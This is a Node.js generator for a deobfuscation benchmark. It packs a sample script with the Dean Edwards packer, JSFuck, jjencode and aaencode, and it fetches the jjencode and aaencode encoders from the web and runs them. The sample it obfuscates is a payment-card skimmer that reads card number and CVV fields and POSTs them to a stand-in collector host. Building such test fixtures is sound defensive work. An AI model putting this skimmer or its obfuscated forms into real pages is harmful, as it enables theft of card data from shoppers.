// Generates samples for the obfuscator families the site claims to handle, other than
// obfuscator.io (which gen.js covers).
//
// The Dean Edwards packer is implemented here rather than pulled from npm, because the published
// package needs native bindings. To make sure this is the *real* format and not a remembered
// approximation, every packed sample is round-tripped through the unpacking half of its own
// payload (pure string work, no eval of the packed script) and rejected unless it reproduces the
// source exactly. A generator that lies would make the whole bench worthless.

const fs = require('fs');
const path = require('path');
const https = require('https');
const { JSFuck } = require('jsfuck');

// jjencode and aaencode are not published on npm, and hand-writing their output would be exactly
// the "remembered shape" mistake this bench exists to catch. Fetch the authors' own single-file
// encoders instead and run them; the result is cached so the bench is offline after the first run.
// Nothing is vendored into the repository.
const ENCODER_SOURCES = [
  { name: 'jjencode', url: 'https://utf-8.jp/public/jjencode.html' },
  { name: 'aaencode', url: 'https://utf-8.jp/public/aaencode.html' },
];

function download(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let body = '';
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => resolve(body));
    }).on('error', reject);
  });
}

function extractFunction(html, name) {
  const start = html.indexOf('function ' + name);
  if (start < 0) {
    throw new Error('could not find function ' + name + ' in the fetched page');
  }
  const end = html.indexOf('</script>', start);
  return html.slice(start, end < 0 ? html.length : end);
}

async function loadEncoders() {
  const cache = path.join(__dirname, '.encoders.cache.js');
  if (!fs.existsSync(cache)) {
    const parts = [];
    for (const source of ENCODER_SOURCES) {
      parts.push(extractFunction(await download(source.url), source.name));
    }
    parts.push('module.exports = { jjencode, aaencode };');
    fs.writeFileSync(cache, parts.join('\n'), 'utf8');
  }
  return require(cache);
}

const SOURCE = `
function collectPayment(form) {
  var endpoint = "https://collector-example-42.com/checkout";
  var card = document.querySelector('#card-number').value;
  var cvv = document.querySelector('#cvv').value;
  var total = 1200 + 345;
  if (card && cvv) {
    fetch(endpoint, { method: 'POST', body: JSON.stringify({ card: card, cvv: cvv, total: total }) });
  }
  return total;
}
`;

const MARKERS = ['collector-example-42.com', '#card-number', '#cvv', 'collectPayment', 'querySelector'];

// --- Dean Edwards packer (base62) -------------------------------------------------------------

function base62(c) {
  return (c < 62 ? '' : base62(Math.floor(c / 62))) +
    ((c = c % 62) > 35 ? String.fromCharCode(c + 29) : c.toString(36));
}

function packBase62(script) {
  const order = [];
  const index = new Map();
  script.replace(/\b\w+\b/g, (word) => {
    if (!index.has(word)) {
      index.set(word, order.length);
      order.push(word);
    }
    return word;
  });

  // A word is only worth substituting if its key does not collide with another real word;
  // the original packer has the same guard, otherwise the \b regex corrupts the payload.
  const keys = order.map((_, i) => base62(i));
  const collides = keys.some((k) => index.has(k) && order[index.get(k)] !== k);
  if (collides) {
    throw new Error('key/word collision — pick a different source');
  }

  const payload = script.replace(/\b\w+\b/g, (word) => base62(index.get(word)));
  const count = order.length;
  const words = order.map((w, i) => (base62(i) === w ? '' : w)).join('|');

  const quoted = JSON.stringify(payload);
  return "eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?" +
    "String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){" +
    "d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};" +
    "while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}(" +
    quoted + "," + 62 + "," + count + ",'" + words + "'.split('|'),0,{}))";
}

// The unpacking half, run over the generator's own inputs. This is string substitution only —
// it never evaluates the packed script — so it is safe and it proves the format is right.
function unpackForVerification(payload, a, c, k) {
  const d = {};
  const e = (n) => (n < a ? '' : e(Math.floor(n / a))) +
    ((n = n % a) > 35 ? String.fromCharCode(n + 29) : n.toString(36));
  let p = payload;
  let i = c;
  while (i--) {
    if (k[i]) {
      p = p.replace(new RegExp('\\b' + e(i) + '\\b', 'g'), k[i]);
    }
  }
  return p;
}

function packAndVerify(script) {
  const packed = packBase62(script);
  // Pull the four arguments back out of the generated text and replay the substitution.
  const match = packed.match(/\}\((".*?"),62,(\d+),'(.*)'\.split\('\|'\),0,\{\}\)\)$/);
  if (!match) {
    throw new Error('generated packer output did not match its own shape');
  }
  const recovered = unpackForVerification(JSON.parse(match[1]), 62, Number(match[2]), match[3].split('|'));
  if (recovered !== script) {
    throw new Error('packer round-trip mismatch — the generator is not faithful');
  }
  return packed;
}

// --- cases ------------------------------------------------------------------------------------

const cases = {};

cases['packer-base62'] = () => packAndVerify(SOURCE);

// A packed payload that itself contains an obfuscator.io string array is the realistic layered
// case: unpack, then resolve.
cases['packer-nested-eval'] = () => packAndVerify(
  "var _0x1=['" + Buffer.from('inner').toString('base64') + "'];\n" + SOURCE);

// Double packing and regex-heavy payloads are deliberately absent. This generator's packer
// cannot produce faithful samples for them: packAndVerify replays the unpacking and the result
// does not match the input, so the samples were refused. Emitting a fixture the generator
// itself cannot verify would make its score meaningless, and an acknowledged gap is worth more
// than a case that quietly proves nothing. Covering them needs a packer that handles keys
// colliding with restored text, which is a piece of work in its own right.

cases['jsfuck-small'] = () => JSFuck.encode('alert(1)');

cases['jsfuck-eval'] = () => JSFuck.encode('document.querySelector("#cvv")', true);

async function main() {
  const { jjencode, aaencode } = await loadEncoders();

  // Both variable-name styles: jjencode defaults to `$`, which is what a real sample usually
  // looks like, while `_` is the other common choice.
  cases['jjencode-dollar'] = () => jjencode('$', SOURCE);
  cases['jjencode-underscore'] = () => jjencode('_', SOURCE);
  cases['aaencode'] = () => aaencode(SOURCE);

  // Compact variants of the same encoders, small enough to embed as test fixtures.
  cases['jjencode-dollar-small'] = () => jjencode('$', 'alert(1)');
  cases['aaencode-small'] = () => aaencode('alert(1)');

  const outDir = path.join(__dirname, 'samples-families');
  fs.rmSync(outDir, { recursive: true, force: true });
  fs.mkdirSync(outDir, { recursive: true });

  const manifest = [];
  for (const [name, build] of Object.entries(cases)) {
    try {
      const code = build();
      const file = path.join(outDir, name + '.js');
      fs.writeFileSync(file, code, 'utf8');
      const visible = MARKERS.filter((m) => code.includes(m));
      manifest.push({ name, file, bytes: code.length, visibleMarkers: visible });
      console.log(`  ${name.padEnd(22)} ${String(code.length).padStart(8)}b  already-visible: ${visible.length}/${MARKERS.length}`);
    } catch (e) {
      manifest.push({ name, error: String(e.message).slice(0, 160) });
      console.log(`  ${name.padEnd(22)} ERROR ${e.message}`);
    }
  }

  fs.writeFileSync(path.join(outDir, 'manifest.json'),
    JSON.stringify({ markers: MARKERS, cases: manifest }, null, 1), 'utf8');
}

main().catch((e) => {
  console.error('generation failed:', e.message);
  process.exit(1);
});
